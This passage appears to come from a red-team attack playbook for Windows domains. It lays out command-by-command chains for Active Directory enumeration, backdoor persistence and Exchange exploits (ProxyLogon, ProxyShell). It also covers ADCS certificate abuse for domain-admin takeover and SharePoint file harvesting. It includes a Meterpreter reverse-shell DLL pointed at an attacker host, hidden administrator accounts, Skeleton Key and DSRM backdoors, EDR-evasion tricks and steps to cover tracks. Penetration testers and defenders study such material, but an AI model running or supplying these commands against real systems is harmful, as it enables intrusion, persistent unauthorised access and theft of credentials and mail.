```
Get-NetGroup -AdminCount | select samaccountname
```

**5. Group Membership**  _[windows]_
_Get group members_
```
Get-NetGroupMember "Domain Admins" | select membername
```

**6. Recursive Group Members**  _[windows]_
_Recursively get group members (including nested groups)_
```
Get-NetGroupMember "Domain Admins" -Recurse
```

**Analysis:** Group enumeration can uncover privileged groups, group membership relationships, nested groups, and more.

**OPSEC:** Group enumeration is a normal operation; focus on privileged groups; watch for nested group relationships

---

### GPO Enumeration  `gpo-enum`
Enumerate Group Policy Objects
Subclass: **GPO** · tags: `gpo` `group-policy` `enumeration`

**Preconditions:** a domain environment; any domain user credential

**Attack chain:**

**1. List GPOs**  _[windows]_
_List all GPOs_
```
Get-GPO -All
```

**2. PowerView Enumeration**  _[windows]_
_Enumerate GPOs with PowerView_
```
Get-NetGPO | select displayname,whencreated
```

**3. GPO Permissions**  _[windows]_
_Find restricted groups within GPOs_
```
Get-NetGPOGroup
```

**4. GPP Passwords**  _[windows]_
_Find passwords in GPP_
```
Get-NetGPPPassword
```

**5. Find Exploitable GPOs**  _[windows]_
_Find which GPOs affect a given user_
```
Find-GPOLocation -UserName user
```

**Analysis:** GPO enumeration can uncover Group Policy configuration, GPP passwords, restricted groups, and more.

**OPSEC:** GPP passwords are a common information disclosure point; GPOs may contain sensitive configuration; watch for GPO modification permissions

---

### ACL Enumeration  `acl-enum`
Enumerate access control lists
Subclass: **ACL** · tags: `acl` `access-control` `enumeration`

**Preconditions:** a domain environment; any domain user credential

**Attack chain:**

**1. PowerView ACL enumeration**  _[windows]_
_Get the ACL of a user object_
```
Get-ObjectAcl -SamAccountName user -ResolveGUIDs
```

**2. Find dangerous permissions**  _[windows]_
_Find interesting ACL permissions_
```
Find-InterestingDomainAcl -ResolveGUIDs
```

**3. Find WriteDACL**  _[windows]_
_Find WriteDACL permissions_
```
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

**4. Find GenericAll**  _[windows]_
_Find GenericAll permissions_
```
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

**5. BloodHound ACL analysis**
_Query ACL relationships with BloodHound_
```
MATCH (n)-[r:AllExtendedRights]->(m) RETURN n,m
```

**Analysis:** ACL enumeration can reveal permission misconfigurations, such as dangerous rights like WriteDACL and GenericAll.

**OPSEC:** ACL misconfiguration is a common privilege escalation path; focus on high-value targets; BloodHound can visualize ACL relationships

---

### Trust Relationship Enumeration  `trust-enum`
Enumerate domain trust relationships
Subclass: **Trust Relationships** · tags: `trust` `enumeration` `active-directory`

**Preconditions:** a domain environment; any domain user credential

**Attack chain:**

**1. Domain trust relationships**  _[windows]_
_List domain trust relationships_
```
nltest /domain_trusts
```

**2. PowerView enumeration**  _[windows]_
_Enumerate trust relationships with PowerView_
```
Get-NetDomainTrust
```

**3. Forest trust**  _[windows]_
_Enumerate forest trust relationships_
```
Get-NetForestTrust
```

**4. Trust details**  _[windows]_
_View trust relationship details_
```
Get-NetDomainTrust | select SourceDomain,TargetDomain,TrustType,TrustDirection
```

**Analysis:** Trust relationship enumeration can reveal cross-domain/cross-forest attack paths.

**OPSEC:** Trust relationships may provide cross-domain attack paths; focus on bidirectional trusts; watch for SID history issues

---

### Computer Enumeration  `computer-enum`
Enumerate computers in the domain
Subclass: **Computers** · tags: `computer` `enumeration` `active-directory`

**Preconditions:** a domain environment; any domain user credential

**Attack chain:**

**1. List domain computers**  _[windows]_
_List domain computers_
```
net group "Domain Computers" /domain
```

**2. PowerView enumeration**  _[windows]_
_Enumerate computers with PowerView_
```
Get-NetComputer | select name,operatingsystem,ipv4address
```

**3. Find domain controllers**  _[windows]_
_Find domain controllers_
```
Get-NetComputer -DomainController
```

**4. Find specific systems**  _[windows]_
_Find a specific operating system_
```
Get-NetComputer -OperatingSystem "*Server 2019*"
```

**5. Find active computers**  _[windows]_
_Find computers that are online_
```
Get-NetComputer -Ping
```

**6. Find administrator sessions**  _[windows]_
_Find where domain admins are logged in_
```
Find-DomainUserLocation
```

**Analysis:** Computer enumeration can reveal all computers in the domain and help identify high-value targets.

**OPSEC:** Computer enumeration is a normal operation; focus on domain controllers and servers; look for administrator sessions

---

## Persistence

### Registry Persistence  `persistence-registry`
Achieve persistence via the registry
Subclass: **Registry** · tags: `persistence` `registry` `windows` `autorun`

**Preconditions:** already have access to the target machine; administrator privileges; Windows system

**Attack chain:**

**1. Run key persistence**  _[windows]_
_Add a Run key for startup execution_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

**2. RunOnce key**  _[windows]_
_RunOnce key, deleted after a single execution_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**3. Winlogon Helper**  _[windows]_
_Modify Userinit for persistence_
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
```

**4. Service persistence**  _[windows]_
_Create a service for persistence_
```
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
```

**EDR bypass variants:**

**1. Hide the registry key**
_Use a null byte to hide the registry key_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\x00" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**Analysis:** Registry persistence executes a malicious program at system startup or user logon.

**OPSEC:** the Run key is the most common persistence method and is easily detected; consider stealthier methods; regularly check for abnormal registry entries

---

### WMI Persistence  `persistence-wmi`
Achieve persistence via WMI event subscription
Subclass: **WMI** · tags: `wmi` `persistence` `windows`

**Preconditions:** administrator privileges

**Attack chain:**

**1. Create an event filter**  _[windows]_
_Create a WMI event filter_
```
$filter = New-WmiEventFilter -Name "evil" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

**2. Create an event consumer**  _[windows]_
_Create a command-line consumer_
```
$consumer = New-WmiEventConsumer -Name "evil" -CommandLineTemplate "powershell -e BASE64_CMD"
```

**3. Bind filter and consumer**  _[windows]_
_Bind to trigger execution_
```
New-WmiFilterToConsumerBinding -Filter $filter -Consumer $consumer
```

---

### Startup Folder Persistence  `persistence-startup`
Achieve persistence via the startup folder
Subclass: **Startup Folder** · tags: `startup` `persistence` `windows`

**Preconditions:** write permission

**Attack chain:**

**1. Current user startup folder**  _[windows]_
_Current user startup_
```
copy evil.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**2. All users startup folder**  _[windows]_
_All users startup_
```
copy evil.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

### Service Persistence  `persistence-service`
Achieve persistence by creating a service
Subclass: **Service** · tags: `service` `persistence` `windows`

**Preconditions:** administrator privileges

**Attack chain:**

**1. Create a service**  _[windows]_
_Create an auto-start service_
```
sc create evilsvc binPath= "cmd /c powershell -e BASE64_CMD" start= auto
```

**2. Start the service**  _[windows]_
_Start the service_
```
sc start evilsvc
```

---

### DLL Injection Persistence  `persistence-dll-injection`
Achieve persistence via DLL injection
Subclass: **DLL Injection** · tags: `dll` `injection` `persistence`

**Preconditions:** code execution; target process

**Attack chain:**

**1. Create a malicious DLL**  _[linux]_
_Generate a malicious DLL_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**2. Inject the DLL**  _[windows]_
_Inject the DLL into a running process_
```
Use a tool such as InjectDLL, PowerShell, etc. to inject into the target process
```

**3. AppInit_DLLs**  _[windows]_
_Inject via AppInit_DLLs_
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f
```

---

### Backdoor User  `persistence-backdoor-user`
Create a backdoor user account
Subclass: **User** · tags: `user` `backdoor` `persistence`

**Preconditions:** administrator privileges

**Attack chain:**

**1. Create a user**  _[windows]_
_Create an administrator user_
```
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add
```

**2. Hide the user**  _[windows]_
_Create a hidden user (ending in $)_
```
net user backdoor$ P@ssw0rd /add
```

**3. Hide via registry modification**  _[windows]_
_Hide the user via the registry_
```
reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\backdoor$" /f
```

---

### Hidden User  `persistence-hidden-user`
Create a hidden administrator user
Subclass: **Hidden User** · tags: `hidden` `user` `persistence`

**Preconditions:** SYSTEM privileges

**Attack chain:**

**1. Create a user**  _[windows]_
_Create a user ending in $_
```
net user hidden$ P@ssw0rd /add
```

**2. Add to the administrators group**  _[windows]_
_Add administrator privileges_
```
net localgroup administrators hidden$ /add
```

**3. Hide via registry**  _[windows]_
_Fully hide via the registry_
```
reg export "HKLM\SAM\SAM\Domains\Account\Users\000003E9" user.reg
Modify the F value
reg import user.reg
```

---

### Scheduled Task Persistence  `persistence-scheduled`
Achieve persistence via scheduled tasks
Subclass: **Scheduled Task** · tags: `persistence` `scheduled` `task`

**Preconditions:** permission to create tasks

**Attack chain:**

**1. Create a logon task**  _[windows]_
_Create a task that runs at logon_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM
```

**2. Create a timed task**  _[windows]_
_Create a task that runs every 5 minutes_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc minute /mo 5
```

**3. Create via PowerShell**  _[windows]_
_Create a task with PowerShell_
```
$action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Backdoor" -User "System"
```

**4. Linux Cron**  _[linux]_
_Linux scheduled task_
```
crontab -e
Add: * * * * * /tmp/backdoor.sh
or: @reboot /tmp/backdoor.sh
```

---

### Skeleton Key Backdoor  `skeleton-key`
Implant a master password on the domain controller
Subclass: **Domain Backdoor** · tags: `skeleton-key` `backdoor` `domain`

**Preconditions:** domain admin privileges; access to a domain controller

**Attack chain:**

**1. Implant the Skeleton Key**  _[windows]_
_Implant using Mimikatz_
```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

**2. Use the master password**  _[windows]_
_Log in using the master password_
```
Master password: mimikatz
Any domain user can log in using "mimikatz" as the password
```

**3. Detection method**  _[windows]_
_Detect the Skeleton Key_
```
Check LSASS memory:
Get-Process lsass
Use EDR to detect memory injection
```

---

### DSRM Backdoor  `dsrm-backdoor`
Establish a backdoor using the DSRM account
Subclass: **Domain Backdoor** · tags: `dsrm` `backdoor` `domain`

**Preconditions:** domain admin privileges; access to a domain controller

**Attack chain:**

**1. Obtain the DSRM password**  _[windows]_
_Obtain the DSRM account hash_
```
mimikatz # lsadump::lsa /patch /name:krbtgt
or
mimikatz # token::elevate
mimikatz # lsadump::sam
```

**2. Sync the DSRM password**  _[windows]_
_Sync the DSRM password with the domain admin_
```
ntdsutil
set dsrm password
sync from domain account admin
q
q
```

**3. Enable the DSRM account**  _[windows]_
_Allow the DSRM account to log on remotely_
```
Modify the registry:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

**4. Log in with DSRM**  _[windows]_
_Use the DSRM account_
```
Use the DSRM account hash:
mimikatz # sekurlsa::pth /domain:DC_NAME /user:Administrator /ntlm:HASH
or use Pass-the-Hash
```

---

### SID History Backdoor  `sid-history`
Establish a backdoor using SID History
Subclass: **Domain Backdoor** · tags: `sid-history` `backdoor` `domain`

**Preconditions:** Domain administrator privileges

**Attack chain:**

**1. Add SID History**  _[windows]_
_Add SID History_
```
mimikatz # sid::add /sam:backdoor_user /new:administrator
Add the domain admin SID to a regular user
```

**2. Verify SID History**  _[windows]_
_Check SID History_
```
Get-ADUser backdoor_user -Properties sidHistory
or
whoami /all
```

**3. Use the backdoor**  _[windows]_
_Use the backdoor account_
```
Log in as backdoor_user
Automatically obtain domain administrator privileges
```

---

### Process Hollowing Persistence  `persistence-process-hollowing`
Achieve persistence using process hollowing techniques
Subclass: **Process Injection** · tags: `process-hollowing` `persistence` `injection`

**Preconditions:** Code execution privileges

**Attack chain:**

**1. Process hollowing principle**  _[windows]_
_Process hollowing principle_
```
1. Create a legitimate process (suspended state)
2. Replace process memory
3. Resume execution
```

**2. C# implementation**  _[windows]_
_C# process hollowing_
```
using System.Runtime.InteropServices;
// Create a suspended process
CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
// Replace memory
NtUnmapViewOfSection(...);
VirtualAllocEx(...);
WriteProcessMemory(...);
ResumeThread(...);
```

**3. Detection method**  _[windows]_
_Detect process hollowing_
```
Check process memory:
- Process path does not match memory content
- Abnormal memory regions
- Use EDR for detection
```

---

## Exchange Attacks

### ProxyLogon Attack  `proxylogon`
CVE-2021-26855 Exchange SSRF
Subclass: **ProxyLogon** · tags: `exchange` `proxylogon` `cve-2021-26855`

**Preconditions:** Exchange is reachable

**Attack chain:**

**1. Probe the vulnerability**  _[linux]_
_Check Exchange version_
```
curl -k https://exchange.com/owa/auth/x.js
Check Exchange version
```

**2. Exploit script**  _[linux]_
_Exploit ProxyLogon_
```
python proxylogon.py -u https://exchange.com -e admin@domain.com
Obtain administrator mailbox access
```

**3. Manual exploitation**
_Manually craft the request_
```
POST /owa/auth/x.js HTTP/1.1
Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;
X-ClientId=xxx

Craft the SSRF request
```

---

### ProxyShell Attack  `proxyshell`
CVE-2021-34473 Exchange RCE
Subclass: **ProxyShell** · tags: `exchange` `proxyshell` `cve-2021-34473`

**Preconditions:** Exchange is reachable

**Attack chain:**

**1. Probe the vulnerability**  _[linux]_
_Probe the vulnerability_
```
curl -k "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"
Check whether the vulnerability exists
```

**2. Exploit script**  _[linux]_
_Exploit ProxyShell_
```
python proxyshell.py -u https://exchange.com -e admin@domain.com
Obtain mailbox access and execute commands
```

**3. Retrieve mail**
_Access the mailbox_
```
GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTTP/1.1
Access mailbox content
```

---

### Exchange Enumeration  `exchange-enum`
Enumerate Exchange services and configuration
Subclass: **Enumeration** · tags: `exchange` `enum` `recon`

**Preconditions:** Exchange is reachable

**Attack chain:**

**1. Version probing**  _[linux]_
_Probe Exchange version_
```
curl -k https://exchange.com/owa/auth/logon.aspx
Check the page source to obtain version information
```

**2. Autodiscover**  _[linux]_
_Autodiscover enumeration_
```
curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml
Obtain Exchange configuration information
```

**3. Mailbox enumeration**  _[linux]_
_Enumerate mailbox users_
```
python oab.py https://exchange.com
Download the offline address book to enumerate users
```

**4. NTLM disclosure**  _[linux]_
_NTLM information disclosure_
```
curl -k https://exchange.com/autodiscover/autodiscover.xml
Obtain domain information from the WWW-Authenticate header
```

---

### ProxyToken Attack  `exchange-proxytoken`
Bypass authentication using Exchange ProxyToken
Subclass: **ProxyToken** · tags: `exchange` `proxytoken` `bypass`

**Preconditions:** Exchange server; vulnerability present

**Attack chain:**

**1. Detect the vulnerability**  _[linux]_
_Detect the vulnerability_
```
Use the ProxyToken tool:
python proxytoken.py -u https://exchange.com -e user@domain.com
Detect whether the vulnerability exists
```

**2. Exploit the vulnerability**  _[linux]_
_Obtain mailbox access_
```
python proxytoken.py -u https://exchange.com -e user@domain.com -a
Obtain user mailbox access
```

**3. Access the mailbox**
_Access the EWS interface_
```
curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"
Bypass authentication to access EWS
```

---

### Exchange Mailbox Access  `exchange-mailbox-access`
Access Exchange mailboxes via various methods
Subclass: **Mailbox Access** · tags: `exchange` `mailbox` `access`

**Preconditions:** Exchange credentials or vulnerability

**Attack chain:**

**1. OWA access**
_OWA web access_
```
https://exchange.com/owa
Log in to OWA with credentials
View mail, calendar, etc.
```

**2. EWS access**  _[linux]_
_EWS API access_
```
Using Impacket:
python exchanger.py domain/user:password@exchange.com
or use EWSTools
```

**3. Outlook MAPI**  _[windows]_
_Outlook client_
```
Configure Outlook to connect to Exchange
Access the mailbox using the MAPI protocol
Supports mail, calendar, contacts
```

**4. Export mailbox**  _[windows]_
_Export mailbox_
```
PowerShell:
New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user.pst"
Export the mailbox as a PST file
```

---

## ADCS Attacks

### ADCS ESC2 Attack  `adcs-esc2`
Exploit ESC2 template misconfiguration
Subclass: **ESC2** · tags: `adcs` `esc2` `certificate`

**Preconditions:** Domain environment; ADCS service; ESC2 template present

**Attack chain:**

**1. Probe for ESC2 templates**  _[linux]_
_Probe for ESC2 templates_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
Look for Any Purpose or CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT templates
```

**2. Request a certificate**  _[linux]_
_Request an administrator certificate_
```
certipy req -u user@domain.com -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```

**3. Authenticate with the certificate**  _[linux]_
_Authenticate with the certificate_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
Obtain the administrator TGT
```

---

### ADCS ESC3 Attack  `adcs-esc3`
Exploit ESC3 enrollment agent misconfiguration
Subclass: **ESC3** · tags: `adcs` `esc3` `certificate`

**Preconditions:** Domain environment; ADCS service; ESC3 configuration present

**Attack chain:**

**1. Probe for ESC3**  _[linux]_
_Probe for ESC3 configuration_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
Look for templates with Enrollment Agent privileges
```

**2. Obtain an enrollment agent certificate**  _[linux]_
_Obtain an enrollment agent certificate_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollmentAgent
Obtain an enrollment agent certificate
```

**3. Request a certificate on behalf of another user**  _[linux]_
_Request a certificate on behalf of an administrator_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\Administrator -pfx agent.pfx
```

---

### ADCS ESC4 Attack  `adcs-esc4`
Exploit ESC4 template permission misconfiguration
Subclass: **ESC4** · tags: `adcs` `esc4` `certificate`

**Preconditions:** Domain environment; ADCS service; write permission on a template

**Attack chain:**

**1. Probe for ESC4**  _[linux]_
_Probe template permissions_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
Look for templates the user has write permission on
```

**2. Modify template configuration**  _[linux]_
_Modify template configuration_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -save-old
Modify the template to an ESC1 configuration
```

**3. Request a certificate**  _[linux]_
_Request an administrator certificate_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```

**4. Restore the template configuration**  _[linux]_
_Restore the template configuration_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json
Restore the original configuration to avoid detection
```

---

### ADCS ESC6 Attack  `adcs-esc6`
Exploit ESC6 editf flag misconfiguration
Subclass: **ESC6** · tags: `adcs` `esc6` `certificate`

**Preconditions:** Domain environment; ADCS service; CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled

**Attack chain:**

**1. Probe for ESC6**  _[linux]_
_Probe CA configuration_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
Look for the EDITF_ATTRIBUTESUBJECTALTNAME2 flag
```

**2. Request a certificate**  _[linux]_
_Request an administrator certificate_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com
Use the -alt parameter to specify the SAN
```

**3. Authenticate with the certificate**  _[linux]_
_Authenticate to obtain a TGT_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

### ADCS ESC8 Attack  `adcs-esc8`
Perform NTLM relay via the ESC8 HTTP endpoint
Subclass: **ESC8** · tags: `adcs` `esc8` `ntlm-relay`

**Preconditions:** Domain environment; ADCS HTTP endpoint; NTLM authentication can be triggered

**Attack chain:**

**1. Probe for ESC8**  _[linux]_
_Probe HTTP endpoints_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
Look for HTTP certificate endpoints
```

**2. Set up NTLM relay**  _[linux]_
_Set up NTLM relay_
```
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
Listen for NTLM authentication and relay it to ADCS
```

**3. Trigger authentication**
_Trigger target NTLM authentication_
```
Trigger using various methods:
- Send an email link
- Printer vulnerability
- WebDAV
- Other NTLM trigger methods
```

---

## SharePoint Attacks

### SharePoint Enumeration  `sharepoint-enum`
Enumerate SharePoint sites and files
Subclass: **Enumeration** · tags: `sharepoint` `enum` `recon`

**Preconditions:** SharePoint is reachable

**Attack chain:**

**1. Site enumeration**  _[linux]_
_Enumerate sites_
```
curl -k https://sharepoint.com/_api/web/webs
Obtain all subsites
```

**2. User enumeration**  _[linux]_
_Enumerate users_
```
curl -k https://sharepoint.com/_api/web/siteusers
Obtain the list of site users
```

**3. File enumeration**  _[linux]_
_Enumerate document libraries_
```
curl -k https://sharepoint.com/_api/web/lists
Obtain the list of document libraries
```

**4. Search files**  _[linux]_
_Search for sensitive content_
```
curl -k "https://sharepoint.com/_api/search/query?querytext='password'"
Search for sensitive files
```

---

### SharePoint File Access  `sharepoint-file-access`
Access files in SharePoint document libraries
Subclass: **File Access** · tags: `sharepoint` `file` `access`

**Preconditions:** SharePoint credentials or vulnerability

**Attack chain:**

**1. Web interface access**
_Web interface access_
```
https://sharepoint.com/sites/site_name/Shared Documents
Access the document library through the browser
Download sensitive files
```

**2. REST API access**  _[linux]_
_REST API access_
```
curl -k -u user:password "https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items"
Obtain the document list
Download file content
```

**3. CSOM access**  _[windows]_
_CSOM access_
```
Use the SharePoint Client Object Model:
ClientContext context = new ClientContext("https://sharepoint.com");
context.Credentials = new SharePointOnlineCredentials(user, password);
List list = context.Web.Lists.GetByTitle("Documents");
```

**4. OneDrive sync**
_OneDrive sync_
```
Use the OneDrive client to sync the SharePoint document library
Access all files locally
View sensitive data offline
```

---

